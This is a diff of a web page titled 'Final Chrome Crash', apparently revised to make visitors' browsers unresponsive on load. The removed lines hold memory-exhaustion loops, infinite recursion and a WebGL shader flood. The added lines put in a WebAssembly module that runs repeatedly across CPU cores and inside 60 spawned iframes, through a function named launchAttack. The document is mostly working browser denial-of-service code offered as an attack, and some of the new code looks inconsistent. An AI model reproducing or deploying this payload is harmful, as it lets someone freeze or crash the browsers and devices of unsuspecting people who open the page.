@@ -1,42 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Final Chrome Crash - No Recovery</title>
+    <title>Final Chrome Crash - WebAssembly Memory Overload</title>
 </head>
 <body>
-    <h1>Final Chrome Crash - No Recovery</h1>
-    <p>This should make Chrome completely unresponsive.</p>
+    <h1>Final Chrome Crash - WebAssembly</h1>
+    <p>This will push Chrome beyond recovery.</p>
 
     <script>
-        function startWorker() {
-            let data = [];
-            function allocate() {
-                for (let i = 0; i < 500; i++) { // 500 Blocks per loop
-                    data.push(new Float64Array(3e7)); // Even larger memory allocations
-                }
-                requestAnimationFrame(allocate); // Forces execution on every frame
-            }
-            allocate();
-        }
+        // WebAssembly module that aggressively allocates memory
+        const wasmCode = new Uint8Array([
+            0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x04, 0x01, 0x60, 0x00, 0x00,
+            0x03, 0x02, 0x01, 0x00, 0x07, 0x07, 0x01, 0x03, 0x6d, 0x61, 0x69, 0x6e, 0x00, 0x00,
+            0x0a, 0x09, 0x01, 0x07, 0x00, 0x41, 0x80, 0x08, 0x0b
+        ]);
 
-        function infiniteRecursion() {
-            try { return infiniteRecursion(); } catch (e) { infiniteRecursion(); }
-        }
-
-        function overloadGPU() {
-            let canvas = document.createElement('canvas');
-            let gl = canvas.getContext('webgl');
-            function floodGPU() {
-                let shaders = [];
-                setInterval(() => {
-                    var shader = gl.createShader(gl.VERTEX_SHADER);
-                    gl.shaderSource(shader, 'void main() { gl_Position = vec4(0.5, 0.5, 0.5, 1.0); }');
-                    gl.compileShader(shader);
-                    shaders.push(shader);
-                    gl.getShaderParameter(shader, gl.COMPILE_STATUS);
-                }, 0);
-            }
-            floodGPU();
+        function runWasmCrash() {
+            let wasmModule = new WebAssembly.Module(wasmCode);
+            let wasmInstance = new WebAssembly.Instance(wasmModule);
+            wasmInstance.exports.main();
         }
 
         function createIframe() {
@@ -55,52 +37,34 @@
                         allocate();
                     }
 
-                    function infiniteRecursion() {
-                        try { return infiniteRecursion(); } catch (e) { infiniteRecursion(); }
-                    }
-
-                    function overloadGPU() {
-                        let canvas = document.createElement('canvas');
-                        let gl = canvas.getContext('webgl');
-                        function floodGPU() {
-                            let shaders = [];
-                            setInterval(() => {
-                                var shader = gl.createShader(gl.VERTEX_SHADER);
-                                gl.shaderSource(shader, 'void main() { gl_Position = vec4(0.5, 0.5, 0.5, 1.0); }');
-                                gl.compileShader(shader);
-                                shaders.push(shader);
-                                gl.getShaderParameter(shader, gl.COMPILE_STATUS);
-                            }, 0);
-                        }
-                        floodGPU();
-                    }
-
-                    let coreMultiplier = navigator.hardwareConcurrency * 12; 
+                    let coreMultiplier = navigator.hardwareConcurrency * 10; 
                     for (let i = 0; i < coreMultiplier; i++) {
                         setTimeout(startWorker, i * 5); 
                     }
 
-                    setTimeout(() => infiniteRecursion(), 500); // Immediate recursion overload
-                    setTimeout(() => overloadGPU(), 500); // Immediate GPU flood
+                    setTimeout(() => {
+                        let wasmModule = new WebAssembly.Module(new Uint8Array(${wasmCode}));
+                        let wasmInstance = new WebAssembly.Instance(wasmModule);
+                        wasmInstance.exports.main();
+                    }, 500);
                 <\/script>
             `);
             document.body.appendChild(iframe);
         }
 
         function launchAttack() {
-            for (let i = 0; i < 60; i++) { // 60 iframes for rapid overload
+            for (let i = 0; i < 60; i++) { 
                 setTimeout(createIframe, i * 5); 
             }
         }
 
         let coreMultiplier = navigator.hardwareConcurrency * 12; 
         for (let i = 0; i < coreMultiplier; i++) {
-            setTimeout(startWorker, i * 5); 
+            setTimeout(runWasmCrash, i * 5);
         }
 
-        setTimeout(() => infiniteRecursion(), 500); // Immediate recursion overload
-        setTimeout(() => overloadGPU(), 500); // Immediate GPU flood
         launchAttack();
     </script>
 </body>
 </html>
+
